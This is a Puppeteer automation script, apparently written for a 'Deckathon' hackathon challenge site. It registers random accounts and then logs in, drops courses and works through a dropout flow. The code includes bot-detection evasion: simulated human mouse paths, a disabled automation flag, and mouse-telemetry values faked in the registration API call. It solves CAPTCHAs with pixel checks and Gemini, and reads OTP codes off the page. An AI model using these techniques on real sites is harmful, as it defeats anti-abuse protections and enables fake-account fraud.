/**
 * Deckathon Registration Automation Script
 * 
 * This script automates the full registration, login, course management, 
 * payment, and dropout process for the Deckathon platform.
 * 
 * Features:
 * - Automated registration with random credentials
 * - CAPTCHA solving using pixel detection and Gemini AI
 * - Course enrollment/drop management
 * - Payment processing with fake card details
 * - Student dropout process completion
 */

const { connect } = require('puppeteer-real-browser');
const { GoogleGenAI } = require('@google/genai');
const sharp = require('sharp');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

// ============================================================================
// CONFIGURATION
// ============================================================================

const CONFIG = {
    REGISTER_URL: 'https://deckathon-concordia.com/register',
    LOGIN_URL: 'https://deckathon-concordia.com/login',
    CHROME_PATH: process.env.CHROME_PATH,
    GEMINI_API_KEY: process.env.GEMINI_API_KEY
};

// Lazy initialize Gemini AI for CAPTCHA solving (only when needed)
let _ai = null;
const getAI = () => {
    if (!_ai) {
        if (!CONFIG.GEMINI_API_KEY) {
            throw new Error('GEMINI_API_KEY is not set. Please provide an API key.');
        }
        _ai = new GoogleGenAI({ apiKey: CONFIG.GEMINI_API_KEY });
    }
    return _ai;
};
// Keep 'ai' as alias for backwards compatibility in functions that use it
const ai = { get models() { return getAI().models; } };

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

/**
 * Sleep for a specified number of milliseconds
 */
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

/**
 * Generate a random lowercase string of specified length
 */
const generateRandomString = (length = 8) => {
    const chars = 'abcdefghijklmnopqrstuvwxyz';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
};

/**
 * Generate a random full name from predefined lists
 */
const generateRandomName = () => {
    const firstNames = ['John', 'Jane', 'Alex', 'Sam', 'Chris', 'Jordan', 'Taylor', 'Morgan', 'Casey', 'Riley', 'Avery', 'Drew', 'Jamie', 'Quinn', 'Skyler'];
    const lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Wilson', 'Anderson', 'Thomas', 'Jackson', 'White'];
    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
    return `${firstName} ${lastName}`;
};

/**
 * Generate a random email address
 */
const generateRandomEmail = () => {
    const username = generateRandomString(10) + Math.floor(Math.random() * 999);
    const domains = ['gmail.com', 'outlook.com', 'yahoo.com', 'hotmail.com'];
    const domain = domains[Math.floor(Math.random() * domains.length)];
    return `${username}@${domain}`;
};

/**
 * Generate a random password meeting complexity requirements
 * Must contain: uppercase, lowercase, number, special character
 */
const generateRandomPassword = () => {
    const uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const lowercase = 'abcdefghijklmnopqrstuvwxyz';
    const numbers = '0123456789';
    const special = '!@#$%^&*';

    // Ensure at least one of each character type
    let password = '';
    password += uppercase[Math.floor(Math.random() * uppercase.length)];
    password += lowercase[Math.floor(Math.random() * lowercase.length)];
    password += numbers[Math.floor(Math.random() * numbers.length)];
    password += special[Math.floor(Math.random() * special.length)];

    // Fill remaining characters randomly
    const allChars = uppercase + lowercase + numbers + special;
    for (let i = password.length; i < 12; i++) {
        password += allChars[Math.floor(Math.random() * allChars.length)];
    }

    // Shuffle the password
    return password.split('').sort(() => Math.random() - 0.5).join('');
};

/**
 * Fast typing function - clicks on selector then types with minimal delay
 */

/**
 * If needed, vary the fast typing delay to be variable from 4-6
 */
const fastType = async (page, selector, text) => {
    await page.click(selector);
    await page.type(selector, text, { delay: 5 });
};

// ============================================================================
// MOUSE MOVEMENT (Anti-Bot Detection)
// ============================================================================

/**
 * Simulate natural human-like mouse movements
 * Uses bezier-like curves with random jitter for realistic movement
 */
async function naturalMouseMove(page) {
    console.log('Moving mouse naturally...');
    let currentX = 500;
    let currentY = 400;

    // Perform 25 movements over ~1 second
    for (let i = 0; i < 25; i++) {
        // Pick a random target position
        const targetX = Math.floor(Math.random() * 700) + 150;
        const targetY = Math.floor(Math.random() * 500) + 150;

        // Move toward target in 2-4 small steps (bezier-like curve)
        const steps = Math.floor(Math.random() * 3) + 2;
        for (let s = 0; s < steps; s++) {
            const progress = (s + 1) / steps;
            // Ease-out curve for natural deceleration
            const eased = 1 - Math.pow(1 - progress, 2);
            // Add small random jitter for imperfection
            const x = Math.floor(currentX + (targetX - currentX) * eased + (Math.random() - 0.5) * 30);
            const y = Math.floor(currentY + (targetY - currentY) * eased + (Math.random() - 0.5) * 30);
            await page.mouse.move(x, y);
            await sleep(Math.floor(Math.random() * 20) + 10);
        }

        currentX = targetX;
        currentY = targetY;
        await sleep(Math.floor(Math.random() * 30) + 10);
    }
}

// Track last known mouse position for bezier movements
let lastMouseX = 500;
let lastMouseY = 400;

/**
 * Move mouse along a quadratic bezier curve from current position to target element
 * Uses a random control point for natural-looking curved movement
 * @param {Page} page - Puppeteer page object
 * @param {string} buttonText - Text content to find the button
 * @returns {boolean} - Whether the button was found and clicked
 */
async function bezierMoveAndClick(page, buttonText) {
    // Find the button and get its bounding box
    const buttonInfo = await page.evaluate((text) => {
        const buttons = Array.from(document.querySelectorAll('button'));
        const btn = buttons.find(b => b.textContent.includes(text) && !b.disabled);
        if (!btn) return null;
        const rect = btn.getBoundingClientRect();
        return {
            x: rect.x + rect.width / 2,
            y: rect.y + rect.height / 2,
            found: true
        };
    }, buttonText);

    if (!buttonInfo) {
        console.log(`Button "${buttonText}" not found`);
        return false;
    }

    const startX = lastMouseX;
    const startY = lastMouseY;
    const endX = buttonInfo.x;
    const endY = buttonInfo.y;

    // Calculate distance for determining number of steps and duration
    const distance = Math.sqrt(Math.pow(endX - startX, 2) + Math.pow(endY - startY, 2));

    // Natural movement duration based on Fitts's law approximation (200-600ms)
    const duration = Math.min(600, Math.max(200, distance * 0.8 + 100));
    const steps = Math.max(20, Math.floor(duration / 16)); // ~60fps

    // Generate random control point for quadratic bezier
    // Control point is offset perpendicular to the direct path
    const midX = (startX + endX) / 2;
    const midY = (startY + endY) / 2;
    const perpOffset = (Math.random() - 0.5) * Math.min(200, distance * 0.4);
    const angle = Math.atan2(endY - startY, endX - startX) + Math.PI / 2;
    const controlX = midX + Math.cos(angle) * perpOffset;
    const controlY = midY + Math.sin(angle) * perpOffset;

    console.log(`Bezier curve: (${Math.round(startX)},${Math.round(startY)}) -> (${Math.round(endX)},${Math.round(endY)}) via control (${Math.round(controlX)},${Math.round(controlY)})`);

    // Move along the quadratic bezier curve
    for (let i = 0; i <= steps; i++) {
        const t = i / steps;

        // Ease-out timing for natural deceleration
        const easedT = 1 - Math.pow(1 - t, 2);

        // Quadratic bezier formula: B(t) = (1-t)²P0 + 2(1-t)tP1 + t²P2
        const oneMinusT = 1 - easedT;
        const x = oneMinusT * oneMinusT * startX +
            2 * oneMinusT * easedT * controlX +
            easedT * easedT * endX;
        const y = oneMinusT * oneMinusT * startY +
            2 * oneMinusT * easedT * controlY +
            easedT * easedT * endY;

        // Add tiny jitter for human imperfection
        const jitterX = (Math.random() - 0.5) * 2;
        const jitterY = (Math.random() - 0.5) * 2;

        await page.mouse.move(x + jitterX, y + jitterY);
        await sleep(duration / steps);
    }

    // Update last known position
    lastMouseX = endX;
    lastMouseY = endY;

    // Small pause before clicking (human reaction time)
    await sleep(50 + Math.random() * 100);

    // Click the button
    await page.evaluate((text) => {
        const buttons = Array.from(document.querySelectorAll('button'));
        const btn = buttons.find(b => b.textContent.includes(text) && !b.disabled);
        if (btn) btn.click();
    }, buttonText);

    return true;
}

/**
 * Close any leftover payment/checkout tabs from previous attempts
 * @param {Browser} browser - Puppeteer browser object
 * @param {Page} mainPage - The main page to keep open
 * @returns {number} - Number of tabs closed
 */
async function closePaymentTabs(browser, mainPage) {
    const pages = await browser.pages();
    let closedCount = 0;

    for (const p of pages) {
        if (p === mainPage) continue;

        try {
            const url = await p.url();
            if (url.includes('payment') || url.includes('checkout') || url.includes('token=')) {
                console.log(`Closing leftover payment tab: ${url.substring(0, 50)}...`);
                await p.close();
                closedCount++;
            }
        } catch (err) {
            // Tab might already be closed
        }
    }

    if (closedCount > 0) {
        console.log(`Closed ${closedCount} leftover payment tab(s)`);
    }
    return closedCount;
}

/**
 * Check if there's a remaining balance that needs payment
 * @param {Page} page - Puppeteer page object
 * @returns {boolean} - True if unpaid balance exists
 */
async function checkRemainingBalance(page) {
    const balanceInfo = await page.evaluate(() => {
        const text = document.body.innerText;

        // Look for "Remaining Balance" or "Balance Due"
        const balanceMatch = text.match(/(?:Remaining Balance|Balance Due)[:\s]*\$?([\d.]+)/i);
        if (balanceMatch) {
            const amount = parseFloat(balanceMatch[1]);
            return { found: true, amount, hasBalance: amount > 0 };
        }

        // Check for "Payment Required" message
        if (text.includes('Payment Required') || text.includes('payment is required')) {
            return { found: true, amount: -1, hasBalance: true };
        }

        return { found: false, amount: 0, hasBalance: false };
    });

    if (balanceInfo.found) {
        console.log(`Balance check: $${balanceInfo.amount} - ${balanceInfo.hasBalance ? 'PAYMENT NEEDED' : 'PAID'}`);
    }

    return balanceInfo.hasBalance;
}

// ============================================================================
// CAPTCHA SOLVING FUNCTIONS
// ============================================================================

/**
 * Solves the first CAPTCHA to sign into the site
 * Solve CAPTCHA using center pixel color detection
 * Identifies logos by looking for very light (white) or very dark (black) center pixels
 */
async function solveCaptcha(page) {
    console.log('Detecting CAPTCHA...');

    // Check if CAPTCHA modal is present
    const hasCaptcha = await page.evaluate(() => {
        return document.body.innerText.includes("Verify You're Human") ||
            document.body.innerText.includes("Select all");
    });

    if (!hasCaptcha) {
        console.log('No CAPTCHA detected');
        return true;
    }

    console.log('CAPTCHA detected! Solving with pixel detection...');

    // Get the category hint
    const category = await page.evaluate(() => {
        const strongEl = document.querySelector('.bg-primary-50 strong');
        return strongEl ? strongEl.textContent.trim() : 'logos';
    });
    console.log(`Category: Select all "${category}"`);

    // Get all image containers in the 3x3 grid
    const imageContainers = await page.$$('.grid.grid-cols-3 > div');

    // Screenshot all images in parallel for speed
    const screenshotPromises = imageContainers.map(async (container, i) => {
        const img = await container.$('img');
        if (!img) return { index: i, isMatch: false };

        try {
            // Take screenshot and decode with sharp
            const screenshotData = await img.screenshot();
            const { data, info } = await sharp(Buffer.from(screenshotData))
                .raw()
                .toBuffer({ resolveWithObject: true });

            // Get center pixel RGB values
            const centerX = Math.floor(info.width / 2);
            const centerY = Math.floor(info.height / 2);
            const pixelIndex = (centerY * info.width + centerX) * info.channels;
            const r = data[pixelIndex];
            const g = data[pixelIndex + 1];
            const b = data[pixelIndex + 2];

            // Check if pixel is very light (white background) or very dark (black logo)
            const isVeryLight = r > 220 && g > 220 && b > 220;
            const isVeryDark = r < 50 && g < 50 && b < 50;
            const isMatch = isVeryLight || isVeryDark;

            console.log(`Image ${i + 1}: RGB(${r},${g},${b}) -> ${isMatch ? 'SELECT' : 'skip'}`);
            return { index: i, isMatch };
        } catch (err) {
            return { index: i, isMatch: false };
        }
    });

    const results = await Promise.all(screenshotPromises);
    const selectedImages = results.filter(r => r.isMatch).map(r => r.index + 1);
    console.log(`Selecting images: ${selectedImages.join(', ') || 'none'}`);

    // Click on matching images
    for (const num of selectedImages) {
        if (imageContainers[num - 1]) {
            await imageContainers[num - 1].click();
            await sleep(50);
        }
    }

    // Click verify button
    await sleep(200);
    await page.evaluate(() => {
        const buttons = Array.from(document.querySelectorAll('button'));
        const btn = buttons.find(b => b.textContent.includes('Verify'));
        if (btn && !btn.disabled) btn.click();
    });
    console.log('Clicked Verify button');
    await sleep(500);
    return true;
}

/**
 * Solve CAPTCHA using Gemini AI with all farmed face images
 * Sends all images from captcha_faces folder for comparison
 * Now deprecated in favor of newer solution, not used in this script
 * However it is still here for reference and very performant
 */
async function solveWhiteCaptcha(page) {
    const hasCaptcha = await page.evaluate(() =>
        document.body.innerText.includes("Verify You're Human")
    );
    if (!hasCaptcha) return;

    console.log('Final CAPTCHA detected! Solving with Gemini...');

    // Load POSITIVE examples (captcha_faces)
    const facesDir = path.join(__dirname, 'captcha_faces');
    if (!fs.existsSync(facesDir)) {
        console.log('No captcha_faces folder found - run imgcapture.js first');
        return;
    }

    const faceFiles = fs.readdirSync(facesDir)
        .filter(f => f.endsWith('.png') || f.endsWith('.jpg') || f.endsWith('.jpeg'));

    if (faceFiles.length === 0) {
        console.log('No farmed faces found - run imgcapture.js first');
        return;
    }

    // Load NEGATIVE examples (captcha_other)
    const otherDir = path.join(__dirname, 'captcha_other');
    let otherFiles = [];
    if (fs.existsSync(otherDir)) {
        otherFiles = fs.readdirSync(otherDir)
            .filter(f => f.endsWith('.png') || f.endsWith('.jpg') || f.endsWith('.jpeg'));
    }

    console.log(`Loading ${faceFiles.length} positive + ${otherFiles.length} negative examples...`);

    // Wait for CAPTCHA images to load
    console.log('Waiting for CAPTCHA images to load...');
    await page.waitForFunction(() => {
        const imgs = document.querySelectorAll('.grid.grid-cols-3 > div img');
        if (imgs.length < 9) return false;
        return Array.from(imgs).every(img => img.complete && img.naturalWidth > 0);
    }, { timeout: 5000 }).catch(() => {
        console.log('Image load timeout - proceeding anyway');
    });
    await sleep(300);

    // Save screenshot
    const screenshotsDir = path.join(__dirname, 'screenshots');
    if (!fs.existsSync(screenshotsDir)) fs.mkdirSync(screenshotsDir, { recursive: true });
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    await page.screenshot({ path: path.join(screenshotsDir, `captcha_${timestamp}.png`) });
    console.log('Saved CAPTCHA screenshot');

    // Get all 9 CAPTCHA images
    const imageContainers = await page.$$('.grid.grid-cols-3 > div');
    const captchaImages = [];

    for (let i = 0; i < imageContainers.length; i++) {
        const img = await imageContainers[i].$('img');
        if (!img) continue;
        try {
            const data = await img.screenshot({ encoding: 'base64' });
            captchaImages.push({ index: i + 1, data });
        } catch (err) { }
    }
    console.log(`Got ${captchaImages.length} CAPTCHA images`);

    // Build POSITIVE request (captcha_faces)
    const buildRequest = (exampleFiles, exampleDir, labelPrefix) => {
        const contents = [];
        contents.push({ text: `KNOWN IMAGES (${exampleFiles.length} images):` });
        for (let i = 0; i < exampleFiles.length; i++) {
            const file = exampleFiles[i];
            const imgPath = path.join(exampleDir, file);
            const data = fs.readFileSync(imgPath).toString('base64');
            const mimeType = file.endsWith('.png') ? 'image/png' : 'image/jpeg';
            contents.push({ inlineData: { mimeType, data } });
            contents.push({ text: `${labelPrefix} ${i + 1}` });
        }
        contents.push({ text: `\nCAPTCHA GRID (9 images numbered 1-9):` });
        for (const img of captchaImages) {
            contents.push({ inlineData: { mimeType: 'image/png', data: img.data } });
            contents.push({ text: `Image ${img.index}` });
        }
        return contents;
    };

    const prompt = `Compare the CAPTCHA images (1-9) against the KNOWN IMAGES.

Your task: Find which CAPTCHA images are PIXEL-FOR-PIXEL the EXACT SAME photograph as any known image.

BE EXTREMELY STRICT:
- Must be the EXACT SAME photograph, just ROTATED and/or CROPPED
- Same person in a DIFFERENT photo = NO MATCH
- Similar looking scene = NO MATCH  
- Only match if you are 100% CERTAIN it's the exact same source image

For each match, you MUST describe SPECIFIC VISUAL EVIDENCE:
- Describe the EXACT background details
- Describe the EXACT pose (hand positions, body angle)
- Describe any text, logos, or unique objects
- Describe clothing details

If you cannot describe specific matching details, it's NOT a match.

The image may be rotated or cropped.

IMPORTANT: Be conservative. It's better to miss a match than include a false positive.

FINAL WARNING: SOMETIMES FAKE IMAGES REPLICATE THE REAL ONES BUT AREN'T THE SAME. BE EXTREMELY STRICT.

On your FINAL LINE, put ONLY the matching numbers comma-separated.
If no certain matches, return "none".

FINAL ANSWER: 3`;

    try {
        // === 3 POSITIVE CALLS (captcha_faces) ===
        console.log('Sending 3 POSITIVE matching calls...');
        const positiveContents = buildRequest(faceFiles, facesDir, 'Known');
        positiveContents.push({ text: prompt });

        const geminiCallPositive = () => ai.models.generateContent({
            model: 'gemini-3-flash-preview',
            contents: positiveContents,
            generationConfig: { thinkingConfig: { thinkingLevel: 'HIGH' } }
        });

        const [pos1, pos2, pos3] = await Promise.all([
            geminiCallPositive().catch(e => ({ text: 'none' })),
            geminiCallPositive().catch(e => ({ text: 'none' })),
            geminiCallPositive().catch(e => ({ text: 'none' }))
        ]);

        // === 3 NEGATIVE CALLS (captcha_other) ===
        let neg1 = { text: 'none' }, neg2 = { text: 'none' }, neg3 = { text: 'none' };
        if (otherFiles.length > 0) {
            console.log('Sending 3 NEGATIVE matching calls...');
            const negativeContents = buildRequest(otherFiles, otherDir, 'Known');
            negativeContents.push({ text: prompt });

            const geminiCallNegative = () => ai.models.generateContent({
                model: 'gemini-3-flash-preview',
                contents: negativeContents,
                generationConfig: { thinkingConfig: { thinkingLevel: 'HIGH' } }
            });

            [neg1, neg2, neg3] = await Promise.all([
                geminiCallNegative().catch(e => ({ text: 'none' })),
                geminiCallNegative().catch(e => ({ text: 'none' })),
                geminiCallNegative().catch(e => ({ text: 'none' }))
            ]);
        }

        // Parse responses
        const parseResponse = (result) => {
            const text = result.text?.trim() || '';
            const lines = text.split('\n').filter(l => l.trim());
            const lastLine = lines[lines.length - 1]
                ?.replace(/\*\*/g, '')
                ?.replace(/FINAL ANSWER:?/i, '')
                ?.trim() || '';
            if (lastLine.toLowerCase() === 'none') return [];
            return [...new Set(lastLine.match(/\d+/g)?.map(n => parseInt(n)).filter(n => n >= 1 && n <= 9) || [])];
        };

        const posVotes1 = parseResponse(pos1);
        const posVotes2 = parseResponse(pos2);
        const posVotes3 = parseResponse(pos3);
        const negVotes1 = parseResponse(neg1);
        const negVotes2 = parseResponse(neg2);
        const negVotes3 = parseResponse(neg3);

        console.log(`Positive votes: [${posVotes1.join(',')}] [${posVotes2.join(',')}] [${posVotes3.join(',')}]`);
        console.log(`Negative votes: [${negVotes1.join(',')}] [${negVotes2.join(',')}] [${negVotes3.join(',')}]`);

        // Calculate scores: +1 for positive vote, -1 for negative vote
        const scores = {};
        for (let i = 1; i <= 9; i++) {
            scores[i] = 0;
            if (posVotes1.includes(i)) scores[i]++;
            if (posVotes2.includes(i)) scores[i]++;
            if (posVotes3.includes(i)) scores[i]++;
            if (negVotes1.includes(i)) scores[i]--;
            if (negVotes2.includes(i)) scores[i]--;
            if (negVotes3.includes(i)) scores[i]--;
        }

        console.log('Scores:', Object.entries(scores).map(([n, s]) => `${n}:${s}`).join(' '));

        // Score >= 2 = SELECT, Score in [-1,1] = UNSURE
        const selectNumbers = Object.entries(scores)
            .filter(([num, score]) => score >= 2)
            .map(([num]) => parseInt(num));

        const unsureNumbers = Object.entries(scores)
            .filter(([num, score]) => score >= -1 && score <= 1)
            .map(([num]) => parseInt(num));

        console.log(`SELECT (score>=2): ${selectNumbers.join(', ') || 'none'}`);
        console.log(`UNSURE (score -1 to 1): ${unsureNumbers.join(', ') || 'none'}`);

        // Save unsure images
        if (unsureNumbers.length > 0) {
            const unsureDir = path.join(__dirname, 'captcha_unsure');
            if (!fs.existsSync(unsureDir)) fs.mkdirSync(unsureDir, { recursive: true });
            for (const num of unsureNumbers) {
                const img = captchaImages.find(c => c.index === num);
                if (img) {
                    const filename = `unsure_${Date.now()}_${num}.png`;
                    fs.writeFileSync(path.join(unsureDir, filename), Buffer.from(img.data, 'base64'));
                }
            }
        }

        // Extract matched positive image numbers for tally
        const allPosResponses = [pos1.text || '', pos2.text || '', pos3.text || ''].join(' ');
        const knownMatches = allPosResponses.match(/Known\s*(?:Image\s*)?(\d+)/gi) || [];
        const matchedKnownNumbers = [...new Set(knownMatches.map(m => parseInt(m.match(/\d+/)[0])))];

        // Click selected images
        for (const num of selectNumbers) {
            if (imageContainers[num - 1]) {
                await imageContainers[num - 1].click();
                await sleep(50);
            }
        }

        global.lastMatchedKnownImages = matchedKnownNumbers;
    } catch (err) {
        console.log('Gemini error:', err.message);
        global.lastMatchedKnownImages = [];
    }

    // Click verify
    await sleep(200);
    await page.evaluate(() => {
        const buttons = Array.from(document.querySelectorAll('button'));
        const btn = buttons.find(b => b.textContent.includes('Verify'));
        if (btn && !btn.disabled) btn.click();
    });
    console.log('Clicked Verify');
    await sleep(1500);
}

/**
 * Solve CAPTCHA using Gemini AI vision
 * Note: The prompt is misleading - it says "sun" but actually wants humans
 */
async function solveGeminiCaptcha(newPage) {
    const hasCaptcha = await newPage.evaluate(() =>
        document.body.innerText.includes("Verify You're Human")
    );
    if (!hasCaptcha) return;

    console.log('CAPTCHA detected! Solving with Gemini...');
    const captchaElement = await newPage.$('.bg-white.rounded-lg.shadow-2xl');
    if (!captchaElement) return;

    // Screenshot the CAPTCHA and send to Gemini
    const screenshotBuffer = await captchaElement.screenshot({ encoding: 'base64' });
    const prompt = `You are looking at a CAPTCHA with a 3x3 grid of images (9 images total).
1 2 3
4 5 6
7 8 9
IMPORTANT: The CAPTCHA prompt is MISLEADING. It may say "sun" but it actually wants HUMAN BEINGS (people, faces).
Find which images contain HUMANS or PEOPLE.
Return ONLY the numbers, separated by commas. Example: 1,3,5`;

    try {
        const result = await ai.models.generateContent({
            model: 'gemini-3-flash-preview',
            contents: [
                { inlineData: { mimeType: 'image/png', data: screenshotBuffer } },
                { text: prompt }
            ],
        });

        const responseText = result.text.trim();
        console.log(`Gemini response: ${responseText}`);

        // Parse response - get ALL numbers 1-9 from the response
        // Look at the last line first (most reliable), then fall back to all lines
        const lines = responseText.split('\n').filter(l => l.trim());
        const lastLine = lines[lines.length - 1] || '';

        // Try to get numbers from last line first
        let numbers = lastLine.match(/\d+/g)?.map(n => parseInt(n)).filter(n => n >= 1 && n <= 9) || [];

        // If last line had no valid numbers, scan entire response for comma-separated list
        if (numbers.length === 0) {
            const matches = responseText.match(/\b([1-9])\b/g);
            if (matches) {
                numbers = [...new Set(matches.map(n => parseInt(n)))];
            }
        }

        console.log(`Selecting images: ${numbers.join(', ')}`);

        // Click selected images
        const imageContainers = await newPage.$$('.grid.grid-cols-3 > div');
        for (const num of numbers) {
            if (imageContainers[num - 1]) {
                await imageContainers[num - 1].click();
                await sleep(50);
            }
        }

        // Click verify
        await sleep(200);
        await newPage.evaluate(() => {
            const buttons = Array.from(document.querySelectorAll('button'));
            const btn = buttons.find(b => b.textContent.includes('Verify'));
            if (btn && !btn.disabled) btn.click();
        });
        console.log('Clicked Verify');
        await sleep(1500);
    } catch (err) {
        console.log('Gemini error:', err.message);
    }
}

// ============================================================================
// ACCOUNT REGISTRATION (API-only)
// ============================================================================

/**
 * Register a new Deckathon account via API
 * @param {Object} options - Optional configuration
 * @param {number} options.runId - Run ID for logging
 * @returns {Promise<{success: boolean, netname: string, password: string, email: string, fullName: string, error: string|null}>}
 */
async function registerDeckathonAccount(options = {}) {
    const { runId } = options;
    const prefix = runId !== undefined ? `[Run ${runId}] ` : '';

    try {
        console.log(`${prefix}Starting Deckathon Account Registration...\n`);

        // Generate random credentials for new account
        const username = generateRandomString(8) + Math.floor(Math.random() * 999);
        const fullName = generateRandomName();
        const email = generateRandomEmail();
        const password = generateRandomPassword();
        console.log('Credentials:', username, '|', fullName, '|', email, '|', password);

        // Get form_prep_token
        console.log('Getting form_prep_token...');
        const prepResponse = await fetch('https://hackathon-backend-326152168.us-east4.run.app/form/prepare/public/register');
        const prepData = await prepResponse.json();
        const formPrepToken = prepData.form_prep_token || prepData.token || '';
        console.log('Got form_prep_token, waiting...');

        // Wait to simulate human form filling time
        await sleep(10000);

        // Register user via API
        console.log('Registering via API...');
        const registerResponse = await fetch('https://hackathon-backend-326152168.us-east4.run.app/user', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: username,
                email: email,
                password: password,
                full_name: fullName,
                form_prep_token: formPrepToken,
                mouse_movement_count: 150 + Math.floor(Math.random() * 100),
                mouse_total_distance: 3000 + Math.floor(Math.random() * 2000),
                recaptcha_token: ''
            })
        });

        const registerData = await registerResponse.json();
        if (registerResponse.ok) {
            console.log('Registration successful via API');
            return {
                success: true,
                netname: username,
                password: password,
                email: email,
                fullName: fullName,
                error: null
            };
        } else {
            console.log('Registration response:', registerData);
            return {
                success: false,
                netname: username,
                password: password,
                email: email,
                fullName: fullName,
                error: registerData.message || 'Registration failed'
            };
        }
    } catch (error) {
        console.error('Registration error:', error.message);
        return {
            success: false,
            netname: null,
            password: null,
            email: null,
            fullName: null,
            error: error.message
        };
    }
}

// ============================================================================
// DROP CLASSES & DROPOUT FLOW (Browser automation)
// ============================================================================

/**
 * Login, drop classes, make payment, and complete dropout
 * @param {Object} options - Configuration
 * @param {string} options.netname - Username/netname to login with
 * @param {string} options.password - Password to login with
 * @param {string} options.email - Email (for credential saving)
 * @param {string} options.fullName - Full name (for credential saving)
 * @param {number} options.runId - Optional run ID for logging
 * @returns {Promise<{success: boolean, username: string, error: string|null}>}
 */
async function dropClasses(options = {}) {
    const { netname, password, email, fullName, runId } = options;

    if (!netname || !password) {
        return { success: false, username: null, error: 'netname and password are required' };
    }

    let browser;
    const prefix = runId !== undefined ? `[Run ${runId}] ` : '';

    try {
        let isSuccess = false;
        console.log(`${prefix}Starting Drop Classes & Dropout Flow...\n`);
        console.log('Using credentials:', netname, '|', password);

        // ====================================================================
        // STEP 1: Connect to browser
        // ====================================================================
        console.log('Connecting...');
        const connection = await connect({
            headless: false,
            fingerprint: false,
            turnstile: true,
            tf: true,
            args: [
                '--window-size=1920,1080',
                '--disable-blink-features=AutomationControlled',
                '--disable-popup-blocking'
            ],
            customConfig: { chromePath: CONFIG.CHROME_PATH },
            connectOption: { defaultViewport: { width: 1920, height: 1080 } }
        });

        browser = connection.browser;
        const page = connection.page;

        // Use provided credentials
        const username = netname;

        // ====================================================================
        // STEP 2: Login with provided credentials
        // ====================================================================
        console.log('Navigating to login page...');
        await page.goto(CONFIG.LOGIN_URL, { waitUntil: 'domcontentloaded', timeout: 15000 });
        await page.waitForSelector('#netname', { timeout: 10000 });
        console.log('On login page');

        // Human-like login with mouse movement
        console.log('Filling login form...');

        // Move mouse to username field
        const usernameField = await page.$('#netname');
        const userBox = await usernameField.boundingBox();
        await page.mouse.move(userBox.x + userBox.width / 2, userBox.y + userBox.height / 2, { steps: 10 });
        await sleep(100);
        await usernameField.click();
        await sleep(200);

        // Type username with human delay
        for (const char of username) {
            await page.keyboard.type(char, { delay: 30 + Math.random() * 50 });
        }
        await sleep(300);

        // Move mouse to password field
        const passwordField = await page.$('#password');
        const passBox = await passwordField.boundingBox();
        await page.mouse.move(passBox.x + passBox.width / 2, passBox.y + passBox.height / 2, { steps: 10 });
        await sleep(100);
        await passwordField.click();
        await sleep(200);

        // Type password with human delay
        for (const char of password) {
            await page.keyboard.type(char, { delay: 30 + Math.random() * 50 });
        }
        await sleep(400);

        console.log('Submitting login...');
        // Move mouse to submit button
        const submitBtn = await page.$('button[type="submit"]');
        if (submitBtn) {
            const btnBox = await submitBtn.boundingBox();
            await page.mouse.move(btnBox.x + btnBox.width / 2, btnBox.y + btnBox.height / 2, { steps: 10 });
            await sleep(200);
        }
        await page.evaluate(() => document.querySelector('button[type="submit"]')?.click());
        await sleep(2500);
        await page.evaluate(() => document.querySelector('button[type="submit"]')?.click());
        await sleep(500);
        await solveCaptcha(page);

        // ====================================================================
        // STEP 5: Handle OTP verification
        // ====================================================================
        await sleep(300);
        const hasOtp = await page.evaluate(() =>
            document.body.innerText.includes('verification code') ||
            document.querySelector('#otp')
        );

        if (hasOtp) {
            console.log('OTP verification detected...');
            const otpCode = await page.evaluate(() =>
                document.querySelector('.text-3xl.font-mono.font-bold')?.textContent?.trim()
            );

            if (otpCode) {
                console.log(`Found OTP code: ${otpCode}`);
                await fastType(page, '#otp', otpCode);
                await sleep(100);
                await page.evaluate(() => {
                    const buttons = Array.from(document.querySelectorAll('button'));
                    buttons.find(btn => btn.textContent.includes('Verify Code') && !btn.disabled)?.click();
                });
                console.log('Submitted OTP');
                await sleep(500);
            }
        }

        await sleep(300);
        console.log('Final URL:', await page.url());

        // ====================================================================
        // STEP 3: Drop all enrolled/waitlisted classes
        // ====================================================================
        console.log('Navigating to courses page...');

        // Open Enrollment menu
        await page.evaluate(() => {
            const buttons = Array.from(document.querySelectorAll('button'));
            buttons.find(btn => btn.textContent.includes('Enrollment'))?.click();
        });
        console.log('Clicked Enrollment button');
        await sleep(300);

        // Click Drop Classes
        await page.evaluate(() => {
            const links = Array.from(document.querySelectorAll('a'));
            links.find(link => link.textContent.includes('Drop Classes'))?.click();
        });
        console.log('Clicked Drop Classes link');
        await sleep(500);

        // Select all enrolled (green) and waitlisted (yellow) courses
        console.log('Selecting courses...');
        const selectedCount = await page.evaluate(() => {
            let count = 0;
            const rows = document.querySelectorAll('tr, .course-row, [class*="course"]');
            rows.forEach(row => {
                const hasGreen = row.querySelector('.text-green-600, .text-green-500, svg.text-green-600');
                const hasYellow = row.querySelector('.text-yellow-600, .text-yellow-500, svg.text-yellow-600');
                if (hasGreen || hasYellow) {
                    const checkbox = row.querySelector('input[type="checkbox"]');
                    if (checkbox && !checkbox.checked) {
                        checkbox.click();
                        count++;
                    }
                }
            });
            return count;
        });
        console.log(`Selected ${selectedCount} courses`);

        // Click Drop Selected Classes button
        await sleep(1500);
        const dropClicked = await page.evaluate(() => {
            const buttons = Array.from(document.querySelectorAll('button'));
            const btn = buttons.find(b =>
                b.textContent.includes('Drop Selected Classes') &&
                b.id?.startsWith('btn-drop')
            );
            if (btn && !btn.disabled) {
                btn.click();
                return true;
            }
            return false;
        });

        if (dropClicked) {
            console.log('Clicked Drop Selected Classes');
            await sleep(500);

            // Enter confirmation word (CONFIRM, PROCEED, etc.)
            const confirmWord = await page.evaluate(() => {
                const input = document.querySelector('input[placeholder*="Type"]');
                if (input) {
                    const match = input.placeholder.match(/'([A-Z]+)'/);
                    return match ? match[1] : null;
                }
                return null;
            });

            if (confirmWord) {
